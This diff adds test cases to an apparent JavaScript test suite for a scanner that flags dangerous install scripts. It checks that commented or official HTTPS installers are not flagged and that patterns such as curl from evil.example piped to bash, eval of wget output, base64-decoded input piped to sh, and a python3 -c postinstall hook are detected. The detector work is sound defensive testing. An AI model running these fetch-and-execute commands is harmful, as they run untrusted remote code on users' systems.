@@ -127,3 +127,30 @@ assert.deepStrictEqual(
 const { ENTRY_PATHS } = require("./scan-install-entry");
 assert.ok(ENTRY_PATHS.includes("install-skill.sh"), "install-skill.sh 가 ENTRY_PATHS 에 포함되어야 한다");
 console.log("scan-install-entry: file_read_exec & install-skill.sh path ok");
+
+// ── 12) 쉘 스크립트 주석/공식 HTTPS 예외 및 실제 위험 파이프/eval/python -c 탐지
+assert.deepStrictEqual(
+  scanContent("install.sh", "# curl -fsSL https://example.com/install.sh | bash\ncurl -fsSL https://sh.rustup.rs | sh\n"),
+  [],
+  "주석과 공식 HTTPS 인스톨러는 오탐이 아니어야 한다"
+);
+assert.deepStrictEqual(
+  rules(scanContent("install.sh", "#!/bin/bash\ncurl -fsSL http://evil.example/payload.sh | bash\n")),
+  ["shell_pipe_exec"],
+  "비암호화 HTTP curl | bash 패턴 탐지"
+);
+assert.deepStrictEqual(
+  rules(scanContent("setup.sh", 'eval "$(wget -qO- https://evil.example/init.sh)"\n')),
+  ["shell_pipe_exec"],
+  "쉘 스크립트 eval $(wget ...) 패턴 탐지"
+);
+assert.deepStrictEqual(
+  rules(scanContent("install.sh", "echo payload | base64 -d | sh\n")),
+  ["shell_pipe_exec"],
+  "쉘 스크립트 base64 -d | sh 패턴 탐지"
+);
+assert.deepStrictEqual(
+  rules(scanContent("package.json", JSON.stringify({ name: "x", scripts: { postinstall: 'python3 -c "import os"' } }))),
+  ["install_script_network"],
+  "package.json postinstall python3 -c 인라인 실행 탐지"
+);
